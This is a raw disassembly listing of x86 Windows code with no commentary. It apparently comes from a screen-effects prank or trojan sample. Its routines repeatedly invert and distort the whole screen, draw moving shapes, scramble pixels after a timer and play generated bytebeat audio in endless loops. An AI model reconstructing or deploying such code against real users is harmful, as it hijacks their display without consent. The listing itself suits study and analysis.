  403af1:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  403af8:	00 
  403af9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403afc:	89 04 24             	mov    %eax,(%esp)
  403aff:	a1 d8 a1 40 00       	mov    0x40a1d8,%eax
  403b04:	ff d0                	call   *%eax
  403b06:	83 ec 24             	sub    $0x24,%esp
  403b09:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403b0c:	89 04 24             	mov    %eax,(%esp)
  403b0f:	a1 ec a1 40 00       	mov    0x40a1ec,%eax
  403b14:	ff d0                	call   *%eax
  403b16:	83 ec 04             	sub    $0x4,%esp
  403b19:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403b1c:	89 04 24             	mov    %eax,(%esp)
  403b1f:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  403b24:	ff d0                	call   *%eax
  403b26:	83 ec 04             	sub    $0x4,%esp
  403b29:	e9 08 fe ff ff       	jmp    0x403936
  403b2e:	55                   	push   %ebp
  403b2f:	89 e5                	mov    %esp,%ebp
  403b31:	53                   	push   %ebx
  403b32:	83 ec 44             	sub    $0x44,%esp
  403b35:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  403b3c:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  403b43:	c7 45 e4 0a 00 00 00 	movl   $0xa,-0x1c(%ebp)
  403b4a:	c7 45 ec 0a 00 00 00 	movl   $0xa,-0x14(%ebp)
  403b51:	c7 45 e8 0a 00 00 00 	movl   $0xa,-0x18(%ebp)
  403b58:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403b5f:	a1 f4 a2 40 00       	mov    0x40a2f4,%eax
  403b64:	ff d0                	call   *%eax
  403b66:	83 ec 04             	sub    $0x4,%esp
  403b69:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403b6c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403b6f:	0f af 45 f4          	imul   -0xc(%ebp),%eax
  403b73:	01 45 ec             	add    %eax,-0x14(%ebp)
  403b76:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403b79:	0f af 45 f0          	imul   -0x10(%ebp),%eax
  403b7d:	01 45 e8             	add    %eax,-0x18(%ebp)
  403b80:	c7 04 24 00 9a 00 00 	movl   $0x9a00,(%esp)
  403b87:	a1 e8 a1 40 00       	mov    0x40a1e8,%eax
  403b8c:	ff d0                	call   *%eax
  403b8e:	83 ec 04             	sub    $0x4,%esp
  403b91:	89 45 dc             	mov    %eax,-0x24(%ebp)
  403b94:	c7 04 24 2c 00 a0 00 	movl   $0xa0002c,(%esp)
  403b9b:	a1 e8 a1 40 00       	mov    0x40a1e8,%eax
  403ba0:	ff d0                	call   *%eax
  403ba2:	83 ec 04             	sub    $0x4,%esp
  403ba5:	89 45 d8             	mov    %eax,-0x28(%ebp)
  403ba8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403bab:	89 44 24 04          	mov    %eax,0x4(%esp)
  403baf:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403bb2:	89 04 24             	mov    %eax,(%esp)
  403bb5:	a1 fc a1 40 00       	mov    0x40a1fc,%eax
  403bba:	ff d0                	call   *%eax
  403bbc:	83 ec 08             	sub    $0x8,%esp
  403bbf:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403bc2:	8d 50 32             	lea    0x32(%eax),%edx
  403bc5:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403bc8:	83 c0 32             	add    $0x32,%eax
  403bcb:	89 54 24 10          	mov    %edx,0x10(%esp)
  403bcf:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403bd3:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403bd6:	89 44 24 08          	mov    %eax,0x8(%esp)
  403bda:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403bdd:	89 44 24 04          	mov    %eax,0x4(%esp)
  403be1:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403be4:	89 04 24             	mov    %eax,(%esp)
  403be7:	a1 f8 a1 40 00       	mov    0x40a1f8,%eax
  403bec:	ff d0                	call   *%eax
  403bee:	83 ec 14             	sub    $0x14,%esp
  403bf1:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403bf4:	8d 58 64             	lea    0x64(%eax),%ebx
  403bf7:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403bfa:	8d 48 64             	lea    0x64(%eax),%ecx
  403bfd:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403c00:	8d 50 32             	lea    0x32(%eax),%edx
  403c03:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403c06:	83 c0 32             	add    $0x32,%eax
  403c09:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  403c0d:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  403c11:	89 54 24 08          	mov    %edx,0x8(%esp)
  403c15:	89 44 24 04          	mov    %eax,0x4(%esp)
  403c19:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403c1c:	89 04 24             	mov    %eax,(%esp)
  403c1f:	a1 f8 a1 40 00       	mov    0x40a1f8,%eax
  403c24:	ff d0                	call   *%eax
  403c26:	83 ec 14             	sub    $0x14,%esp
  403c29:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403c2c:	89 44 24 04          	mov    %eax,0x4(%esp)
  403c30:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403c33:	89 04 24             	mov    %eax,(%esp)
  403c36:	a1 fc a1 40 00       	mov    0x40a1fc,%eax
  403c3b:	ff d0                	call   *%eax
  403c3d:	83 ec 08             	sub    $0x8,%esp
  403c40:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403c43:	8d 48 32             	lea    0x32(%eax),%ecx
  403c46:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403c49:	83 c0 64             	add    $0x64,%eax
  403c4c:	8b 55 ec             	mov    -0x14(%ebp),%edx
  403c4f:	83 c2 32             	add    $0x32,%edx
  403c52:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  403c56:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403c5a:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403c5d:	89 44 24 08          	mov    %eax,0x8(%esp)
  403c61:	89 54 24 04          	mov    %edx,0x4(%esp)
  403c65:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403c68:	89 04 24             	mov    %eax,(%esp)
  403c6b:	a1 f8 a1 40 00       	mov    0x40a1f8,%eax
  403c70:	ff d0                	call   *%eax
  403c72:	83 ec 14             	sub    $0x14,%esp
  403c75:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403c78:	8d 48 64             	lea    0x64(%eax),%ecx
  403c7b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403c7e:	8d 50 32             	lea    0x32(%eax),%edx
  403c81:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403c84:	83 c0 32             	add    $0x32,%eax
  403c87:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  403c8b:	89 54 24 0c          	mov    %edx,0xc(%esp)
  403c8f:	89 44 24 08          	mov    %eax,0x8(%esp)
  403c93:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403c96:	89 44 24 04          	mov    %eax,0x4(%esp)
  403c9a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403c9d:	89 04 24             	mov    %eax,(%esp)
  403ca0:	a1 f8 a1 40 00       	mov    0x40a1f8,%eax
  403ca5:	ff d0                	call   *%eax
  403ca7:	83 ec 14             	sub    $0x14,%esp
  403caa:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  403cb1:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  403cb6:	ff d0                	call   *%eax
  403cb8:	83 ec 04             	sub    $0x4,%esp
  403cbb:	39 45 e8             	cmp    %eax,-0x18(%ebp)
  403cbe:	0f 9d c0             	setge  %al
  403cc1:	84 c0                	test   %al,%al
  403cc3:	74 07                	je     0x403ccc
  403cc5:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  403ccc:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403cd3:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  403cd8:	ff d0                	call   *%eax
  403cda:	83 ec 04             	sub    $0x4,%esp
  403cdd:	39 45 ec             	cmp    %eax,-0x14(%ebp)
  403ce0:	0f 9d c0             	setge  %al
  403ce3:	84 c0                	test   %al,%al
  403ce5:	74 07                	je     0x403cee
  403ce7:	c7 45 f4 ff ff ff ff 	movl   $0xffffffff,-0xc(%ebp)
  403cee:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  403cf2:	75 07                	jne    0x403cfb
  403cf4:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  403cfb:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  403cff:	75 07                	jne    0x403d08
  403d01:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  403d08:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403d0b:	89 04 24             	mov    %eax,(%esp)
  403d0e:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  403d13:	ff d0                	call   *%eax
  403d15:	83 ec 04             	sub    $0x4,%esp
  403d18:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403d1b:	89 04 24             	mov    %eax,(%esp)
  403d1e:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  403d23:	ff d0                	call   *%eax
  403d25:	83 ec 04             	sub    $0x4,%esp
  403d28:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403d2b:	89 44 24 04          	mov    %eax,0x4(%esp)
  403d2f:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403d36:	a1 04 a3 40 00       	mov    0x40a304,%eax
  403d3b:	ff d0                	call   *%eax
  403d3d:	83 ec 08             	sub    $0x8,%esp
  403d40:	c7 04 24 0a 00 00 00 	movl   $0xa,(%esp)
  403d47:	a1 50 a2 40 00       	mov    0x40a250,%eax
  403d4c:	ff d0                	call   *%eax
  403d4e:	83 ec 04             	sub    $0x4,%esp
  403d51:	e9 02 fe ff ff       	jmp    0x403b58
  403d56:	55                   	push   %ebp
  403d57:	89 e5                	mov    %esp,%ebp
  403d59:	53                   	push   %ebx
  403d5a:	81 ec 84 00 00 00    	sub    $0x84,%esp
  403d60:	a1 3c a2 40 00       	mov    0x40a23c,%eax
  403d65:	ff d0                	call   *%eax
  403d67:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403d6a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403d71:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  403d76:	ff d0                	call   *%eax
  403d78:	83 ec 04             	sub    $0x4,%esp
  403d7b:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403d7e:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  403d85:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  403d8a:	ff d0                	call   *%eax
  403d8c:	83 ec 04             	sub    $0x4,%esp
  403d8f:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403d92:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403d95:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  403d99:	89 c2                	mov    %eax,%edx
  403d9b:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403d9e:	01 d0                	add    %edx,%eax
  403da0:	c1 e0 02             	shl    $0x2,%eax
  403da3:	c7 44 24 0c 04 00 00 	movl   $0x4,0xc(%esp)
  403daa:	00 
  403dab:	c7 44 24 08 00 30 00 	movl   $0x3000,0x8(%esp)
  403db2:	00 
  403db3:	89 44 24 04          	mov    %eax,0x4(%esp)
  403db7:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403dbe:	a1 64 a2 40 00       	mov    0x40a264,%eax
  403dc3:	ff d0                	call   *%eax
  403dc5:	83 ec 10             	sub    $0x10,%esp
  403dc8:	89 45 dc             	mov    %eax,-0x24(%ebp)
  403dcb:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  403dd2:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403dd9:	a1 f4 a2 40 00       	mov    0x40a2f4,%eax
  403dde:	ff d0                	call   *%eax
  403de0:	83 ec 04             	sub    $0x4,%esp
  403de3:	89 45 d8             	mov    %eax,-0x28(%ebp)
  403de6:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403de9:	89 04 24             	mov    %eax,(%esp)
  403dec:	a1 e0 a1 40 00       	mov    0x40a1e0,%eax
  403df1:	ff d0                	call   *%eax
  403df3:	83 ec 04             	sub    $0x4,%esp
  403df6:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  403df9:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403dfc:	89 44 24 10          	mov    %eax,0x10(%esp)
  403e00:	c7 44 24 0c 20 00 00 	movl   $0x20,0xc(%esp)
  403e07:	00 
  403e08:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  403e0f:	00 
  403e10:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403e13:	89 44 24 04          	mov    %eax,0x4(%esp)
  403e17:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403e1a:	89 04 24             	mov    %eax,(%esp)
  403e1d:	a1 dc a1 40 00       	mov    0x40a1dc,%eax
  403e22:	ff d0                	call   *%eax
  403e24:	83 ec 14             	sub    $0x14,%esp
  403e27:	89 45 d0             	mov    %eax,-0x30(%ebp)
  403e2a:	8b 45 d0             	mov    -0x30(%ebp),%eax
  403e2d:	89 44 24 04          	mov    %eax,0x4(%esp)
  403e31:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  403e34:	89 04 24             	mov    %eax,(%esp)
  403e37:	a1 fc a1 40 00       	mov    0x40a1fc,%eax
  403e3c:	ff d0                	call   *%eax
  403e3e:	83 ec 08             	sub    $0x8,%esp
  403e41:	c7 44 24 20 20 00 cc 	movl   $0xcc0020,0x20(%esp)
  403e48:	00 
  403e49:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  403e50:	00 
  403e51:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  403e58:	00 
  403e59:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403e5c:	89 44 24 14          	mov    %eax,0x14(%esp)
  403e60:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403e63:	89 44 24 10          	mov    %eax,0x10(%esp)
  403e67:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403e6a:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403e6e:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  403e75:	00 
  403e76:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  403e7d:	00 
  403e7e:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  403e81:	89 04 24             	mov    %eax,(%esp)
  403e84:	a1 d8 a1 40 00       	mov    0x40a1d8,%eax
  403e89:	ff d0                	call   *%eax
  403e8b:	83 ec 24             	sub    $0x24,%esp
  403e8e:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403e91:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  403e95:	8d 14 85 00 00 00 00 	lea    0x0(,%eax,4),%edx
  403e9c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403e9f:	89 44 24 08          	mov    %eax,0x8(%esp)
  403ea3:	89 54 24 04          	mov    %edx,0x4(%esp)
  403ea7:	8b 45 d0             	mov    -0x30(%ebp),%eax
  403eaa:	89 04 24             	mov    %eax,(%esp)
  403ead:	a1 f4 a1 40 00       	mov    0x40a1f4,%eax
  403eb2:	ff d0                	call   *%eax
  403eb4:	83 ec 0c             	sub    $0xc,%esp
  403eb7:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  403ebe:	c6 45 cf 00          	movb   $0x0,-0x31(%ebp)
  403ec2:	a1 3c a2 40 00       	mov    0x40a23c,%eax
  403ec7:	ff d0                	call   *%eax
  403ec9:	8b 55 e8             	mov    -0x18(%ebp),%edx
  403ecc:	29 d0                	sub    %edx,%eax
  403ece:	3d 60 ea 00 00       	cmp    $0xea60,%eax
  403ed3:	0f 97 c0             	seta   %al
  403ed6:	84 c0                	test   %al,%al
  403ed8:	74 2f                	je     0x403f09
  403eda:	e8 59 2f 00 00       	call   0x406e38
  403edf:	89 c1                	mov    %eax,%ecx
  403ee1:	ba 81 80 80 80       	mov    $0x80808081,%edx
  403ee6:	89 c8                	mov    %ecx,%eax
  403ee8:	f7 ea                	imul   %edx
  403eea:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  403eed:	c1 f8 07             	sar    $0x7,%eax
  403ef0:	89 c2                	mov    %eax,%edx
  403ef2:	89 c8                	mov    %ecx,%eax
  403ef4:	c1 f8 1f             	sar    $0x1f,%eax
  403ef7:	29 c2                	sub    %eax,%edx
  403ef9:	89 d0                	mov    %edx,%eax
  403efb:	89 c2                	mov    %eax,%edx
  403efd:	c1 e2 08             	shl    $0x8,%edx
  403f00:	29 c2                	sub    %eax,%edx
  403f02:	89 c8                	mov    %ecx,%eax
  403f04:	29 d0                	sub    %edx,%eax
  403f06:	88 45 cf             	mov    %al,-0x31(%ebp)
  403f09:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  403f10:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403f13:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  403f17:	39 45 ec             	cmp    %eax,-0x14(%ebp)
  403f1a:	0f 8d d3 00 00 00    	jge    0x403ff3
  403f20:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403f23:	99                   	cltd
  403f24:	f7 7d e4             	idivl  -0x1c(%ebp)
  403f27:	89 55 c8             	mov    %edx,-0x38(%ebp)
  403f2a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403f2d:	99                   	cltd
  403f2e:	f7 7d e4             	idivl  -0x1c(%ebp)
  403f31:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  403f34:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403f37:	99                   	cltd
  403f38:	f7 7d e0             	idivl  -0x20(%ebp)
  403f3b:	89 d0                	mov    %edx,%eax
  403f3d:	85 c0                	test   %eax,%eax
  403f3f:	75 2e                	jne    0x403f6f
  403f41:	e8 f2 2e 00 00       	call   0x406e38
  403f46:	89 c1                	mov    %eax,%ecx
  403f48:	ba 95 20 4f 09       	mov    $0x94f2095,%edx
  403f4d:	89 c8                	mov    %ecx,%eax
  403f4f:	f7 ea                	imul   %edx
  403f51:	c1 fa 02             	sar    $0x2,%edx
  403f54:	89 c8                	mov    %ecx,%eax
  403f56:	c1 f8 1f             	sar    $0x1f,%eax
  403f59:	29 c2                	sub    %eax,%edx
  403f5b:	89 d0                	mov    %edx,%eax
  403f5d:	6b c0 6e             	imul   $0x6e,%eax,%eax
  403f60:	29 c1                	sub    %eax,%ecx
  403f62:	89 c8                	mov    %ecx,%eax
  403f64:	85 c0                	test   %eax,%eax
  403f66:	74 07                	je     0x403f6f
  403f68:	b8 01 00 00 00       	mov    $0x1,%eax
  403f6d:	eb 05                	jmp    0x403f74
  403f6f:	b8 00 00 00 00       	mov    $0x0,%eax
  403f74:	84 c0                	test   %al,%al
  403f76:	74 13                	je     0x403f8b
  403f78:	e8 bb 2e 00 00       	call   0x406e38
  403f7d:	99                   	cltd
  403f7e:	c1 ea 1c             	shr    $0x1c,%edx
  403f81:	01 d0                	add    %edx,%eax
  403f83:	83 e0 0f             	and    $0xf,%eax
  403f86:	29 d0                	sub    %edx,%eax
  403f88:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403f8b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403f8e:	8d 14 85 00 00 00 00 	lea    0x0(,%eax,4),%edx
  403f95:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403f98:	01 c2                	add    %eax,%edx
  403f9a:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403f9d:	01 d0                	add    %edx,%eax
  403f9f:	0f b6 10             	movzbl (%eax),%edx
  403fa2:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403fa5:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403fa8:	01 c8                	add    %ecx,%eax
  403faa:	8d 0c 85 00 00 00 00 	lea    0x0(,%eax,4),%ecx
  403fb1:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403fb4:	01 c1                	add    %eax,%ecx
  403fb6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403fb9:	01 c8                	add    %ecx,%eax
  403fbb:	0f b6 08             	movzbl (%eax),%ecx
  403fbe:	8b 45 c8             	mov    -0x38(%ebp),%eax
  403fc1:	88 45 b7             	mov    %al,-0x49(%ebp)
  403fc4:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  403fc7:	89 c3                	mov    %eax,%ebx
  403fc9:	0f b6 45 b7          	movzbl -0x49(%ebp),%eax
  403fcd:	0f af c3             	imul   %ebx,%eax
  403fd0:	01 c1                	add    %eax,%ecx
  403fd2:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403fd5:	8d 1c 85 00 00 00 00 	lea    0x0(,%eax,4),%ebx
  403fdc:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403fdf:	01 c3                	add    %eax,%ebx
  403fe1:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403fe4:	01 d8                	add    %ebx,%eax
  403fe6:	29 ca                	sub    %ecx,%edx
  403fe8:	88 10                	mov    %dl,(%eax)
  403fea:	83 45 ec 01          	addl   $0x1,-0x14(%ebp)
  403fee:	e9 1d ff ff ff       	jmp    0x403f10
  403ff3:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403ff6:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  403ffa:	c1 e0 02             	shl    $0x2,%eax
  403ffd:	89 c2                	mov    %eax,%edx
  403fff:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404002:	89 44 24 08          	mov    %eax,0x8(%esp)
  404006:	89 54 24 04          	mov    %edx,0x4(%esp)
  40400a:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40400d:	89 04 24             	mov    %eax,(%esp)
  404010:	a1 00 a2 40 00       	mov    0x40a200,%eax
  404015:	ff d0                	call   *%eax
  404017:	83 ec 0c             	sub    $0xc,%esp
  40401a:	c7 44 24 20 08 00 33 	movl   $0x330008,0x20(%esp)
  404021:	00 
  404022:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  404029:	00 
  40402a:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  404031:	00 
  404032:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404035:	89 44 24 14          	mov    %eax,0x14(%esp)
  404039:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40403c:	89 44 24 10          	mov    %eax,0x10(%esp)
  404040:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404043:	89 44 24 0c          	mov    %eax,0xc(%esp)
  404047:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40404e:	00 
  40404f:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  404056:	00 
  404057:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40405a:	89 04 24             	mov    %eax,(%esp)
  40405d:	a1 d8 a1 40 00       	mov    0x40a1d8,%eax
  404062:	ff d0                	call   *%eax
  404064:	83 ec 24             	sub    $0x24,%esp
  404067:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40406a:	89 04 24             	mov    %eax,(%esp)
  40406d:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  404072:	ff d0                	call   *%eax
  404074:	83 ec 04             	sub    $0x4,%esp
  404077:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40407a:	89 04 24             	mov    %eax,(%esp)
  40407d:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  404082:	ff d0                	call   *%eax
  404084:	83 ec 04             	sub    $0x4,%esp
  404087:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40408a:	89 04 24             	mov    %eax,(%esp)
  40408d:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  404092:	ff d0                	call   *%eax
  404094:	83 ec 04             	sub    $0x4,%esp
  404097:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  40409b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40409e:	ba 56 55 55 55       	mov    $0x55555556,%edx
  4040a3:	89 c8                	mov    %ecx,%eax
  4040a5:	f7 ea                	imul   %edx
  4040a7:	89 c8                	mov    %ecx,%eax
  4040a9:	c1 f8 1f             	sar    $0x1f,%eax
  4040ac:	29 c2                	sub    %eax,%edx
  4040ae:	89 d0                	mov    %edx,%eax
  4040b0:	01 c0                	add    %eax,%eax
  4040b2:	01 d0                	add    %edx,%eax
  4040b4:	29 c1                	sub    %eax,%ecx
  4040b6:	89 c8                	mov    %ecx,%eax
  4040b8:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4040bb:	e9 12 fd ff ff       	jmp    0x403dd2
  4040c0:	55                   	push   %ebp
  4040c1:	89 e5                	mov    %esp,%ebp
  4040c3:	53                   	push   %ebx
  4040c4:	b8 24 4d 0a 00       	mov    $0xa4d24,%eax
  4040c9:	e8 02 2b 00 00       	call   0x406bd0
  4040ce:	29 c4                	sub    %eax,%esp
  4040d0:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4040d7:	66 c7 45 de 01 00    	movw   $0x1,-0x22(%ebp)
  4040dd:	66 c7 45 e0 01 00    	movw   $0x1,-0x20(%ebp)
  4040e3:	c7 45 e2 22 56 00 00 	movl   $0x5622,-0x1e(%ebp)
  4040ea:	c7 45 e6 22 56 00 00 	movl   $0x5622,-0x1a(%ebp)
  4040f1:	66 c7 45 ea 01 00    	movw   $0x1,-0x16(%ebp)
  4040f7:	66 c7 45 ec 08 00    	movw   $0x8,-0x14(%ebp)
  4040fd:	66 c7 45 ee 00 00    	movw   $0x0,-0x12(%ebp)
  404103:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  40410a:	00 
  40410b:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  404112:	00 
  404113:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40411a:	00 
  40411b:	8d 45 de             	lea    -0x22(%ebp),%eax
  40411e:	89 44 24 08          	mov    %eax,0x8(%esp)
  404122:	c7 44 24 04 ff ff ff 	movl   $0xffffffff,0x4(%esp)
  404129:	ff 
  40412a:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40412d:	89 04 24             	mov    %eax,(%esp)
  404130:	a1 10 a3 40 00       	mov    0x40a310,%eax
  404135:	ff d0                	call   *%eax
  404137:	83 ec 18             	sub    $0x18,%esp
  40413a:	c7 85 26 b3 f5 ff 00 	movl   $0x0,-0xa4cda(%ebp)
  404141:	00 00 00 
  404144:	8d 85 2a b3 f5 ff    	lea    -0xa4cd6(%ebp),%eax
  40414a:	ba b4 4c 0a 00       	mov    $0xa4cb4,%edx
  40414f:	89 54 24 08          	mov    %edx,0x8(%esp)
  404153:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40415a:	00 
  40415b:	89 04 24             	mov    %eax,(%esp)
  40415e:	e8 e5 2c 00 00       	call   0x406e48
  404163:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40416a:	81 7d f4 b7 4c 0a 00 	cmpl   $0xa4cb7,-0xc(%ebp)
  404171:	0f 87 8b 00 00 00    	ja     0x404202
  404177:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40417a:	83 e0 9a             	and    $0xffffff9a,%eax
  40417d:	89 c2                	mov    %eax,%edx
  40417f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404182:	0f af c0             	imul   %eax,%eax
  404185:	c1 e8 05             	shr    $0x5,%eax
  404188:	89 d1                	mov    %edx,%ecx
  40418a:	09 c1                	or     %eax,%ecx
  40418c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40418f:	83 e0 21             	and    $0x21,%eax
  404192:	89 c2                	mov    %eax,%edx
  404194:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404197:	c1 e8 08             	shr    $0x8,%eax
  40419a:	09 d0                	or     %edx,%eax
  40419c:	31 c1                	xor    %eax,%ecx
  40419e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4041a1:	83 e0 0e             	and    $0xe,%eax
  4041a4:	89 c2                	mov    %eax,%edx
  4041a6:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4041a9:	c1 e8 09             	shr    $0x9,%eax
  4041ac:	09 c2                	or     %eax,%edx
  4041ae:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4041b1:	83 e0 4c             	and    $0x4c,%eax
  4041b4:	09 d0                	or     %edx,%eax
  4041b6:	31 c1                	xor    %eax,%ecx
  4041b8:	89 ca                	mov    %ecx,%edx
  4041ba:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4041bd:	83 c8 bb             	or     $0xffffffbb,%eax
  4041c0:	89 d3                	mov    %edx,%ebx
  4041c2:	31 c3                	xor    %eax,%ebx
  4041c4:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4041c7:	c1 e8 08             	shr    $0x8,%eax
  4041ca:	89 c2                	mov    %eax,%edx
  4041cc:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4041cf:	05 46 03 00 00       	add    $0x346,%eax
  4041d4:	c1 e8 0d             	shr    $0xd,%eax
  4041d7:	21 d0                	and    %edx,%eax
  4041d9:	89 c1                	mov    %eax,%ecx
  4041db:	8b 45 f4             	mov    -0xc(%ebp),%eax
